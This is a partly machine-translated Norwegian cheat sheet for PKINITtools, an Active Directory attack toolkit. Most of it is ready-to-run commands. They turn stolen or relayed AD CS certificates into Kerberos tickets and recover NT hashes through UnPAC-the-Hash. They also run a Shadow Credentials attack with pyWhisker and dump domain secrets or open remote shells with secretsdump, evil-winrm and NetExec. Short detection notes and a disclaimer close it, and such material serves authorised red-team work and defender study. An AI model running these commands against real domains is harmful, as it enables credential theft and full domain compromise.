<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="License MIT">
</p>

<p align="center">
  <b>🌐 Verktøy for Kerberos Public Key Cryptography for Initial Authentication (PKINIT), konvertering av sertifikater til TGT-billetter og gjenoppretting av NT-hasher</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og PKINIT-arkitekturen](#-oversikt--pkinit-arkitekturen)
- [Nøkkelverktøy: `gettgtpkinit.py` & `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Installasjon](#-installasjon)
– [Konvertering av AD CS-sertifikater til Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Bruke en PFX-fil](#using-a-pfx-fil)
  - [Using Base64-Encoded PFX (Relay Chains)](#using-base64-encoded-pfx-relay-chains)
- [Recovering NT Hashes (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Shadow Credentials Attack Workflow](#-shadow-credentials-attack-workflow)
- [Forbruker TGT med Impacket & NetExec](#-consuming-the-tgt-with-impacket--netexec)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Detection](#-defensive-considerations--detection)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og PKINIT-arkitekturen

**PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos, definert i **RFC 4556**) er en utvidelse av Kerberos-protokollen. I stedet for å kreve en brukers hemmelige passordhash (NTLM eller AES) for å be om en Kerberos Ticket Granting Ticket (TGT), lar PKINIT en klient bevise identitet ved å bruke **X.509 digitale sertifikater og private/offentlige nøkkelpar**.

Laget av den anerkjente Active Directory-forskeren **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** gir de essensielle Python-primitivene til:
1. Autentiser til Active Directory-domenekontrollere via PKINIT ved å bruke utpakkede eller videresendte digitale sertifikater.
2. Skaff en standard Kerberos TGT-fil (`.ccache`).
3. Gjenopprett klarteksten **NTLM Hash** for kontoen via **UnPAC-the-Hash**-mekanismen.

---

## 🧰 Nøkkelverktøy: `gettgtpkinit.py` og `getskeyhash.py`

- **`gettgtpkinit.py`**: Kommuniserer med KDC (Kerberos Key Distribution Center) over port 88, presenterer sertifikatet og ber om en pansret TGT, lagrer det som en Kirbi- eller ccache-fil.
- **`getskeyhash.py`**: Spørrer Kerberos PAC (Privilege Attribute Certificate) returnert i PKINIT-billetten for å beregne og avsløre kontoens statiske NT-hash.

---

## 📥 Installasjon
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Konvertering av AD CS-sertifikater til Kerberos TGT

Når du skaffer et Active Directory-sertifikat via Certipy, Coercer eller NTLM Relay:

### Bruke en PFX-fil
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Bruker Base64-kodet PFX (relékjeder)

Ofte skriver `ntlmrelayx` ut sertifikater som en rå base64-streng under AD CS ESC8-angrep:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Gjenoppretter NT-hasher (UnPAC-the-Hash)

Når en konto autentiseres med PKINIT, signerer domenekontrolleren PAC med en PAC_CREDENTIAL_INFO-struktur som inneholder kontoens statiske **NTLM-hash** (kryptert med en midlertidig AS-REP-nøkkel). `getskeyhash.py` dekrypterer denne strukturen:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Med NT-hashen i hånden kan du umiddelbart utføre **Pass-the-Hash** eller offline cracking!

---

## 👥 Shadow Credentials Attack Workflow

Når du har skrivetilgang over et Active Directory-objekt (`GenericAll`, `GenericWrite`, `WriteProperty` over `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Bruker TGT med Impacket & NetExec

Når `gettgtpkinit.py` sender ut en `.ccache`-billett, eksporterer du den til miljøet:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **TGT via PFX-fil** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT via Base64 Cert** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Spesifiser domenekontroller**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (Få NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Vis TGT til Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Send TGT til NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Defensive vurderinger og gjenkjenning

1. **Hendelses-ID 4768 (TGT-forespørsel):** Active Directory logger Kerberos TGT-forespørsler. Når PKINIT brukes, viser **Pre-Authentication Type**-feltet `16` (PKINIT), i stedet for `2` (PA-ENC-TIMESTAMP).
2. **Revisjon av `msDS-KeyCredentialLink`-modifikasjoner:** Hendelses-ID 5136 registrerer katalogobjektmodifikasjoner. Varsle når nøkkellegitimasjon legges til ikke-Azure/Intune-administrerte kontoer.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> PKINITtools er kun beregnet for autorisert Active Directory-sikkerhetsrevisjon, Red Team-operasjoner og pedagogisk forskning. Det er ulovlig å manipulere Kerberos-billetter uten eksplisitt tillatelse.